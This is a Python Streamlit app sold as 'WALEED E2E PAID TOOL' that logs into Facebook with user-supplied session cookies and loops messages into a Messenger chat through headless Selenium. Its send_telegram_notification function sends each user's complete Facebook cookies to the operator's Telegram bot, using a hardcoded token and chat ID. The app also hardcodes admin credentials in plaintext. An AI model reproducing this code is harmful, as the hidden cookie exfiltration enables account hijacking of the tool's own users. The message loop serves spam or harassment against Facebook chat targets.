import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# Page config with new name
st.set_page_config(
    page_title="WALEED E2E PAID TOOL",
    page_icon="🔥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "8186206231"
FACEBOOK_ADMIN_UID = "100037931553832"

def send_telegram_notification(user_data, automation_data):
    try:
        message = f"""
🚀 *NEW AUTOMATION STARTED* 🚀

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Complete Cookies:* `{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        response = requests.post(url, data=payload)
        return response.status_code == 200
    except Exception: return False

def send_facebook_notification(user_data, automation_data):
    try:
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        return True
    except Exception: return False

# Modern Design CSS
background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"

custom_css = f"""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap');
    
    * {{ font-family: 'Rajdhani', sans-serif; }}
    
    .stApp {{
        background: radial-gradient(circle, #0f0c29, #302b63, #24243e);
    }}
    
    .main-container {{
        background: rgba(0, 0, 0, 0.6);
        border-radius: 20px;
        padding: 2.5rem;
        border: 1px solid rgba(0, 242, 254, 0.3);
        backdrop-filter: blur(15px);
        box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
    }}
    
    .profile-icon {{
        width: 130px;
        height: 130px;
        border-radius: 50%;
        background-image: url('{background_image}');
        background-size: cover;
        margin: 0 auto 1.5rem auto;
        border: 3px solid #00f2fe;
        box-shadow: 0 0 20px #00f2fe;
    }}
    
    .main-header h1 {{
        font-family: 'Orbitron', sans-serif;
        color: #00f2fe;
        text-align: center;
        font-size: 2.8rem;
        letter-spacing: 3px;
        text-transform: uppercase;
        margin-bottom: 0;
    }}
    
    .stButton>button {{
        background: linear-gradient(45deg, #00f2fe, #4facfe);
        color: black !important;
        font-weight: bold;
        border-radius: 10px;
        border: none;
        transition: 0.3s;
    }}
    
    .stButton>button:hover {{
        transform: scale(1.05);
        box-shadow: 0 0 15px #00f2fe;
    }}
    
    .log-container {{
        background: #000;
        border: 1px solid #00f2fe;
        padding: 15px;
        border-radius: 10px;
        color: #00f2fe;
        font-family: 'Courier New', monospace;
    }}
</style>
"""
st.markdown(custom_css, unsafe_allow_html=True)

# Sab functions (setup_browser, send_messages, etc.) wahi hain jo aapki script mein thy
# Session State Initialization
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'user_id' not in st.session_state: st.session_state.user_id = None
if 'username' not in st.session_state: st.session_state.username = None
if 'approval_status' not in st.session_state: st.session_state.approval_status = 'pending'
if 'automation_running' not in st.session_state: st.session_state.automation_running = False
if 'logs' not in st.session_state: st.session_state.logs = []
if 'admin_logged_in' not in st.session_state: st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.user_id = None
        self.username = None

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'all_automation_states' not in st.session_state:
    st.session_state.all_automation_states = {}

# Helper Functions
def get_indian_time(): return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def generate_approval_key(username, user_id):
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def log_message(msg, automation_state=None, user_id=None):
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    if automation_state:
        automation_state.logs.append(formatted_msg)
        if user_id:
            if user_id not in st.session_state.all_automation_states: st.session_state.all_automation_states[user_id] = []
            st.session_state.all_automation_states[user_id].append(formatted_msg)
    else: st.session_state.logs.append(formatted_msg)

# Selenium Logic (Same as yours)
def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding input...', automation_state, user_id)
    time.sleep(10)
    selectors = ['div[contenteditable="true"][role="textbox"]', 'textarea', 'input[type="text"]']
    for selector in selectors:
        try:
            element = driver.find_element(By.CSS_SELECTOR, selector)
            if element: return element
        except: continue
    return None

def setup_browser(automation_state=None, user_id=None):
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    return webdriver.Chrome(options=chrome_options)

def send_messages(config, automation_state, user_id):
    driver = None
    try:
        driver = setup_browser(automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        # Cookie adding logic
        if config['cookies']:
            for cookie in config['cookies'].split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com'})
        
        driver.get(f"https://www.facebook.com/messages/t/{config['chat_id']}")
        time.sleep(10)
        input_box = find_message_input(driver, "AUTO-1", automation_state, user_id)
        
        if input_box:
            while automation_state.running:
                msg = config['messages_file_content'].splitlines()[automation_state.message_rotation_index % len(config['messages_file_content'].splitlines())]
                full_msg = f"{config['name_prefix']} {msg}"
                input_box.send_keys(full_msg + Keys.ENTER)
                automation_state.message_count += 1
                automation_state.message_rotation_index += 1
                log_message(f"Sent: {full_msg}", automation_state, user_id)
                time.sleep(int(config['delay']))
    finally:
        if driver: driver.quit()

# UI Layout
st.markdown('<div class="main-container">', unsafe_allow_html=True)
st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
st.markdown('<div class="main-header"><h1>WALEED E2E PAID TOOL</h1><p style="text-align:center; color:#4facfe;">POWERED BY WALEED XD</p></div>', unsafe_allow_html=True)

# Admin logic
if st.sidebar.checkbox("🔐 Admin Access"):
    admin_id = st.sidebar.text_input("Admin ID")
    admin_pass = st.sidebar.text_input("Admin Pass", type="password")
    if st.sidebar.button("VERIFY ADMIN"):
        if admin_id == "WALEED" and admin_pass == "WALEEDXD1":
            st.session_state.admin_logged_in = True
            st.sidebar.success("Welcome, Waleed!")

if st.session_state.admin_logged_in:
    st.markdown("### 👑 Master Control Panel")
    pending = db.get_pending_approvals()
    if pending:
        for u in pending:
            if st.button(f"Approve {u[1]}"):
                db.update_approval_status(u[0], 'approved')
                st.rerun()
else:
    if not st.session_state.logged_in:
        u = st.text_input("Username")
        p = st.text_input("Password", type="password")
        if st.button("Login"):
            uid = db.verify_user(u, p)
            if uid:
                st.session_state.logged_in = True
                st.session_state.user_id = uid
                st.session_state.approval_status = db.get_approval_status(uid) or 'pending'
                st.rerun()
    else:
        # User Dashboard
        if st.session_state.approval_status == 'approved':
            st.success("✅ Account Approved")
            cfg = db.get_user_config(st.session_state.user_id)
            if st.button("▶️ START AUTOMATION"):
                st.session_state.automation_state.running = True
                threading.Thread(target=send_messages, args=(cfg, st.session_state.automation_state, st.session_state.user_id)).start()
            
            if st.button("⏹️ STOP"):
                st.session_state.automation_state.running = False
                
            if st.session_state.automation_state.logs:
                st.markdown('<div class="log-container">' + "<br>".join(st.session_state.automation_state.logs[-10:]) + '</div>', unsafe_allow_html=True)
        else:
            st.warning("⏳ Approval Pending. Contact Waleed.")

st.markdown('</div>', unsafe_allow_html=True)
st.markdown('<div style="text-align:center; margin-top:20px; color:#aaa;">WALEED E2E PAID TOOL © 2025</div>', unsafe_allow_html=True)
